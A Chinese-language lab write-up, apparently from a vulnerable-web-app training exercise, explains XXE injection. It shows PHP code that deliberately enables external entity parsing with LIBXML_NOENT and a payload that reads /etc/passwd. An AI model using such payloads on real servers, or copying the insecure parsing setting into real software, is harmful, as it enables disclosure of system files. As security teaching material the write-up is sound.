
# 概述
XXE "xml external entity injection"既"xml外部实体注入漏洞"。概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。

具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。

XML语法结构大致如下
```
第一部分：XML声明部分
<?xml version="1.0"?>

第二部分：文档类型定义 DTD
<!DOCTYPE note[ 
<!--定义此文档是note类型的文档-->
<!ENTITY entity-name SYSTEM "URI/URL">
<!--外部实体声明-->
]>

第三部分：文档元素
<note>
<to>LS</to>
<from>XMTX</from>
<head>Reminder</head>
<body>Is a good</body>
</note>
```


# XXE漏洞

## 查看关键代码
```php
$html='';
//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析
if(isset($_POST['submit']) and $_POST['xml'] != null){


    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="
<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

可以看到添加了LIBXML_NOENT参数开启了外部实体解析


## 实战
这个也没什么好说的吧
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY XMTX SYSTEM "file:///etc/passwd">
]>
<x>&XMTX;</x>
```
![image-20210715152910525.png](./assets/1655881363832-a1066b59-2df0-4d26-aea1-9da25c6a5d4a.png)
